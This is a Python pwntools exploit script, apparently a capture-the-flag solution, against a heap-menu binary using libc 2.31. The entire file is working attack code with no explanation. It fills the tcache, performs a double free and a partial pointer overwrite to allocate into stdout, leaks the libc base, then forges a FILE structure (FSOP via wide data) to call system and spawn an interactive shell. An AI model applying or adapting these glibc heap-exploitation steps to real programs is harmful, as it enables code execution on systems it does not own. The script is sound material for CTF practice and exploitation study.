#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched')
libc = ELF('libc-2.31.so')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
recvut = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add(size):
	sa(b"> ", b"1")
	sa("much? ", f"{size}".encode())

def edit(index, data):
	sa(b"> ", b"2")
	sa(b"Index: ", f"{index}".encode())
	sa(b"Name: ", data)

def dele(index):
	sa(b"> ", b"3")
	sa(b"Index: ", f"{index}".encode())

script = '''
brva 0x16C1
brva 0x15EF
'''
#for i in range(1):
while(True):
	try:
		p = process('chall_patched')
		#p = gdb.debug('chall_patched', gdbscript = script)

		for i in range(9):
			add(0xe8)
		add(0x18)

		for i in range(7): # fill tcache
			dele(i)

		dele(8)
		dele(7)
		add(0xe8) # take 1 chunk out from tcache
		dele(8) # dbf, this goes to tcache
		add(0xc8)
		add(0x18)
		add(0x18) # tcache bins next ptr now has libc value
		edit(3, p16(0x16a0)) # modify last 2 bytes
		add(0xe8)
		add(0xe8) # this will malloc into stdout (index 5)

		# stdout 0.5
		payload = p64(0xfbad1887) + p64(0) * 3 + p8(0)
		edit(5, payload)
		p.recv(0x8)
		libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1ec980
		lleak("libc base", libc_base)

		# fsop
		_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
		system = libc_base + libc.symbols['system']
		fp = FileStructure()
		fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
		fp._IO_read_end = system
		fp._lock = _IO_2_1_stdout_ + 0x50
		fp._wide_data = _IO_2_1_stdout_
		fp.vtable = libc_base  + 0x1e8f40 # qword ptr [vtable + 0x38] = __GI__IO_wfile_overflow 
		payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
		#debug()
		edit(5, payload)

		sl(b"echo vanishing")
		recvut(b"vanishing")
		break
	except:
		try:
			p.close()
		except:
			pass

p.interactive()
